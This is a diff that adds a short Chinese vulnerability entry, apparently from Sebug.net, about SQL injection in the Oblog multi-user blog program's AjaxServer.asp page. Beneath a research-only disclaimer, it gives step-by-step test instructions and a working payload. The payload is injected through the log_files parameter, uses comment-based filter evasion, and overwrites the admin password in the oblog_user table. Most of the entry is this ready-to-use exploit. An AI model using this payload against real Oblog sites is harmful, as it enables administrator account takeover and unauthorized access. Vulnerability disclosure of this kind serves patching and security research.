@@ -1,0 +1,6 @@
+Oblog多用户博客程序AjaxServer.asp页面过滤不严导致SQL注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.首先找到使用sql版本的系统注册用户test，发表新日志，同时抓包， 修改log_files。2);update/**/oblog_user/**/set/**/password=7a57a5a743894a0e/**/where/**/username=admin;--
